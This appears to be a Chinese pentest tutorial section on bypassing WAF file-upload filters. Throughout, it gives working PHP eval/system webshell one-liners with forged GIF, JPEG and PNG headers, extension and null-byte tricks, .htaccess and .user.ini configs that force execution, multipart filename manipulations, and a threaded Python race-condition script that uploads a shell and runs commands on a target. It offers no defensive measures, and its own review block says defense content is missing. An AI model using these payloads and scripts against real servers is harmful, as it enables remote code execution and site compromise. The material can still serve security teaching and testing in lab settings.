# 文件上传WAF绕过

### 4.1 Content-Type修改

```
文件上传绕过 - Content-Type:
┌─────────────────────────────────────────────┐
│ 原始请求:                                    │
│ Content-Type: application/x-php              │
│ → 被WAF拦截                                  │
│                                              │
│ 修改后:                                      │
│ Content-Type: image/jpeg                     │
│ → 绕过WAF的Content-Type检测                  │
│                                              │
│ 后端如果仅检查Content-Type → 上传成功         │
│ 后端如果检查文件内容 → 需配合文件头伪造       │
└─────────────────────────────────────────────┘
```

### 4.2 文件头伪造

在恶意文件内容前添加合法文件头，绕过基于文件头（Magic Number）的检测：

```php
// GIF文件头 + PHP代码
GIF89a <?php @eval($_POST['cmd']); ?>

// JPEG文件头
\xFF\xD8\xFF\xE0<?php @eval($_POST['cmd']); ?>

// PNG文件头
\x89PNG\r\n\x1a\n<?php @eval($_POST['cmd']); ?>
```

**绕过原理：** 后端使用`finfo`或`getimagesize()`检测文件类型时，主要依据文件头判断。添加合法文件头后，这些函数会将其识别为图片文件，但Web服务器仍会将其作为PHP执行（如果后缀为.php）。

### 4.3 后缀变形

利用Web服务器和后端对不同文件后缀的处理差异：

```
后缀变形绕过:
├── Apache解析漏洞
│   ├── test.php.jpg → Apache可能将.php.jpg作为PHP执行
│   ├── test.php.xxx.jpg → 多后缀解析
│   └── test.php%00.jpg → 空字节截断
│
├── PHP后缀变形
│   ├── .php3 / .php4 / .php5 / .php7
│   ├── .phtml / .pht / .phps
│   └── .phar
│
├── ASP/ASPX变形
│   ├── .asp / .aspx / .asa / .asax
│   ├── .cer / .cdx
│   └── .ashx / .asmx
│
├── JSP变形
│   ├── .jsp / .jspx
│   ├── .jspf / .jspa
│   └── .jhtml
│
└── 大小写变形
    ├── .PHP / .Php / .pHp
    └── 利用大小写不敏感的系统
```

### 4.4 .htaccess绕过

利用Apache的`.htaccess`配置文件改变文件执行行为：

```apache
# .htaccess方式1: 将特定后缀作为PHP执行
AddType application/x-httpd-php .jpg

# .htaccess方式2: 为特定文件设置PHP处理器
<FilesMatch "shell">
    SetHandler application/x-httpd-php
</FilesMatch>

# .htaccess方式3: auto_prepend_file
php_value auto_prepend_file "/path/to/hidden_shell.php"
```

**利用流程：**
1. 先上传`.htaccess`文件（如果允许上传）
2. 再上传`shell.jpg`（内容为PHP代码）
3. Apache根据`.htaccess`将`.jpg`作为PHP执行

### 4.5 .user.ini绕过（PHP）

```ini
; .user.ini - PHP用户配置文件
; 在Web目录中创建此文件
; PHP在执行该目录中的PHP文件前自动加载

; 将隐藏的Shell文件在每个PHP请求前自动包含
auto_prepend_file = .hidden_shell.php

; 或直接包含图片马
auto_prepend_file = uploads/avatar.jpg
```

**利用流程：**
1. 上传`.user.ini`到Web目录
2. 上传包含PHP代码的文件（如`avatar.jpg`）
3. 访问该目录中任意PHP文件 → 自动包含Shell

### 4.6 multipart/form-data绕过

利用多部分表单的数据解析差异：

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundary--

-- 绕过变形:

变形1 - filename编码:
filename="shell.ph%70"  → 后端URL解码 → shell.php

变形2 - 双filename:
filename="shell.jpg"; filename="shell.php"
→ WAF取第一个, 后端取最后一个

变形3 - 空字节截断:
filename="shell.php%00.jpg"
→ WAF看到.jpg, 后端截断为.php

变形4 - Content-Disposition变形:
Content-Disposition: form-data; name=file; filename=shell.php
→ 去掉引号

变形5 - 多boundary:
Content-Type: multipart/form-data; boundary=A; boundary=B
→ 解析差异
```

### 4.7 竞争条件绕过

利用文件上传到删除之间的时间窗口执行Shell：

```python
# 竞争条件利用脚本（概念示意）
import requests
import threading

def upload_and_access():
    while True:
        # 上传Shell
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        r = requests.post('http://target/upload.php', files=files)
        # 立即访问（在文件被删除前执行）
        r = requests.get('http://target/uploads/shell.php?cmd=id')
        if 'uid=' in r.text:
            print('Success:', r.text)
            break

# 多线程竞争
threads = [threading.Thread(target=upload_and_access) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

**原理：** 某些上传逻辑是先保存文件再检查并删除，在保存到删除之间存在时间窗口，高并发请求可以在文件被删除前访问并执行。

---

---

## 📋 内容审核与补充建议

> 针对「文件上传WAF绕过」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
